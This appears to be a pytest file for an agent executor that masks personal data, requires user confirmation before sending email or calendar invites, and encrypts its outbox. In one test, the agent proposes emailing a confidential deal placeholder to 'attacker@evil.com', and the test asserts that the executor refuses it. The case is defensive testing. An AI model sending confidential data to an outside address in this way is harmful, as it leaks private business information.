import json

import pytest

from muse_shield.agent.executor import Executor, remask
from muse_shield.app.vault import Vault
from test_a2a_policy import vc  # noqa: F401  (fixture)


def test_email_needs_confirmation_then_runs_and_result_is_masked(vc):
    v, chat = vc
    ex = Executor(v)
    a = ex.propose(chat, "send_email", {"to": "<PERSON_1>", "subject": "About <DEAL_1>", "body": "Hi <PERSON_1>, price <DEAL_VALUE_1>."})
    assert a.status == "pending" and a.preview["to"] == ["priya@kestrel.io"] and "Priya Shah" in a.preview["body"]
    assert v.outbox(chat) == []  # nothing sent before the user confirms
    done = ex.confirm(a.action_id)
    assert done.status == "done" and done.preview == {}
    sent = v.outbox(chat)[0]["payload"]
    assert sent["to"] == ["priya@kestrel.io"] and sent["body"] == "Hi Priya Shah, price ₹120 crore." and not sent["delivered"]
    agent_view = json.dumps(done.for_agent())
    assert "priya@kestrel.io" not in agent_view and "Priya" not in agent_view and "<CONTACT_1>" in agent_view
    assert v.consents(chat)[-1]["decision"] == "allow"
    with pytest.raises(KeyError):
        ex.confirm(a.action_id)  # one confirmation per action


def test_deny_and_refused(vc):
    v, chat = vc
    ex = Executor(v)
    a = ex.propose(chat, "send_email", {"to": "<PERSON_1>", "subject": "x", "body": "x"})
    assert ex.deny(a.action_id).status == "denied" and v.outbox(chat) == []
    bad = ex.propose(chat, "send_email", {"to": "attacker@evil.com", "subject": "x", "body": "<DEAL_1>"})
    assert bad.status == "refused" and bad.preview == {} and v.outbox(chat) == []


def test_local_note_runs_without_confirmation(vc):
    v, chat = vc
    a = Executor(v).propose(chat, "save_note", {"title": "t", "body": "<PERSON_1> owns <DEAL_1>"})
    assert a.status == "done" and v.outbox(chat)[0]["payload"]["body"].startswith("Priya Shah owns Acme buys")
    assert "Priya" not in json.dumps(a.for_agent())


def test_calendar_invite_builds_ics(vc):
    v, chat = vc
    ex = Executor(v)
    a = ex.propose(chat, "create_calendar_event", {"title": "Sync on <DEAL_1>", "attendees": ["<PERSON_1>"], "start": "2026-11-05T10:00:00+05:30"})
    ex.confirm(a.action_id)
    ics = v.outbox(chat)[0]["payload"]["ics"]
    assert "ATTENDEE:mailto:priya@kestrel.io" in ics and "DTSTART:20261105T043000Z" in ics


def test_tool_errors_are_masked_too(vc):
    v, chat = vc

    def boom(vault, chat_id, args):
        raise RuntimeError(f"SMTP refused {args['to'][0]}")

    ex = Executor(v, runners={"send_email": boom})
    a = ex.confirm(ex.propose(chat, "send_email", {"to": "<PERSON_1>", "subject": "x", "body": "x"}).action_id)
    assert a.status == "failed" and "priya@kestrel.io" not in a.error and "<CONTACT_1>" in a.error


def test_remask_longest_first():
    assert remask({"m": "Priya Shah wrote to Priya"}, {"<PERSON_1>": "Priya Shah", "<PERSON_2>": "Priya"}) == {"m": "<PERSON_1> wrote to <PERSON_2>"}


def test_outbox_is_encrypted_at_rest(vc, tmp_path):
    v, chat = vc
    ex = Executor(v)
    ex.confirm(ex.propose(chat, "send_email", {"to": "<PERSON_1>", "subject": "x", "body": "Dear <PERSON_1>"}).action_id)
    raw = (tmp_path / "v.db").read_bytes()
    assert b"priya@kestrel.io" not in raw and b"Priya Shah" not in raw
